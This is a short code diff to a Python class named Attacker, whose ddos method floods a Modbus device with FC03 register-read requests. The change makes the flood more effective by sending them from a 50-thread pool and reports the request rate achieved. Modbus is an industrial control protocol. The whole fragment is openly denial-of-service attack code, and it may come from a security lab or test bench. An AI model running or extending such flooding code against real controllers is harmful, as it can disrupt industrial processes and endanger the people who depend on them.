@@ -100,11 +100,16 @@ class Attacker:
 
     def ddos(self, count: int = 500) -> float:
         """Flood FC03 reads; returns achieved requests/sec."""
+        import concurrent.futures
         t0 = time.time()
-        ok = 0
-        for _ in range(count):
-            if self._modbus(struct.pack(">BHH", 0x03, 0, 6)) is not None:
-                ok += 1
+        payload = struct.pack(">BHH", 0x03, 0, 6)
+        
+        def _send(_):
+            return 1 if self._modbus(payload) is not None else 0
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+            ok = sum(executor.map(_send, range(count)))
+
         dt = time.time() - t0
         return ok / dt if dt else 0.0
 
